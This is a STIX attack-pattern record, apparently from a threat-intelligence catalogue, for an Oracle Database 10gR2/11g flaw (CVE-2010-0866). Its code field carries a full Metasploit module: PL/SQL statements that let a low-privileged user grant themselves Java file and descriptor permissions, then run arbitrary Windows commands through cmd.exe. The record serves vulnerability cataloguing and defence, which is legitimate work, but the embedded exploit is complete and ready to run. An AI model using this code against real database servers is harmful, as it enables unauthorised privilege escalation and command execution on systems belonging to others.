{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--248e8489-7f2e-4993-9b9b-21c9571451aa",
    "created": "2024-08-14T16:22:17.890476Z",
    "modified": "2024-08-14T16:22:17.89048Z",
    "name": "Oracle DB 10gR2, 11gR1/R2 DBMS_JVM_EXP_PERMS OS Command Execution",
    "description": " This module exploits a flaw (0 day) in DBMS_JVM_EXP_PERMS package that allows any user with create session privilege to grant themselves java IO privileges. Identified by David Litchfield. Works on 10g R2, 11g R1 and R2 (Windows only) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/jvm_os_code_10g.rb",
            "external_id": "jvm_os_code_10g.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0866"
        },
        {
            "source_name": "reference",
            "url": "http://blackhat.com/html/bh-dc-10/bh-dc-10-archives.html#Litchfield"
        },
        {
            "source_name": "reference",
            "url": "http://www.notsosecure.com/folder2/2010/02/04/hacking-oracle-11g/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB 10gR2, 11gR1/R2 DBMS_JVM_EXP_PERMS OS Command Execution',\n      'Description'    => %q{\n          This module exploits a flaw (0 day) in DBMS_JVM_EXP_PERMS package that allows\n        any user with create session privilege to grant themselves java IO privileges.\n        Identified by David Litchfield. Works on 10g R2, 11g R1 and R2 (Windows only)\n      },\n      'Author'         => [ 'sid[at]notsosecure.com' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-0866'],\n          [ 'OSVDB', '62184'],\n          [ 'URL', 'http://blackhat.com/html/bh-dc-10/bh-dc-10-archives.html#Litchfield' ],\n          [ 'URL', 'http://www.notsosecure.com/folder2/2010/02/04/hacking-oracle-11g/' ],\n        ],\n      'DisclosureDate' => '2010-02-01'))\n\n    register_options(\n      [\n        OptString.new('CMD', [ false, 'CMD to execute.',  \"echo metasploit >> %SYSTEMDRIVE%\\\\\\\\unbreakable.txt\"]),\n      ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    name = Rex::Text.rand_text_alpha(rand(10) + 1)\n\n\n    package1 = \"DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;\" +\n      \"CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','\"\n    package1 << \"<\" << \"<ALL FILES>>','execute','ENABLED' from dual;\" +\n      \"BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;\"\n    package2 = \"DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;\" +\n      \"CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.lang.RuntimePermission','writeFileDescriptor',NULL,'ENABLED' FROM DUAL;\" +\n      \"BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;\"\n    package3 = \"DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;\" +\n      \"CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.lang.RuntimePermission','readFileDescriptor',NULL,'ENABLED' FROM DUAL;\" +\n      \"BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;\"\n\n    os_code = \"select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe', '/c', ' #{datastore['CMD']}')from dual\"\n\n    begin\n      print_status(\"Attempting to grant JAVA IO Privileges\")\n      prepare_exec(package1)\n      prepare_exec(package2)\n      prepare_exec(package3)\n      print_status(\"Attempting to execute OS Code\")\n      prepare_exec(os_code)\n    rescue => e\n      print_error(\"Error: #{e.class} #{e}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-01"
}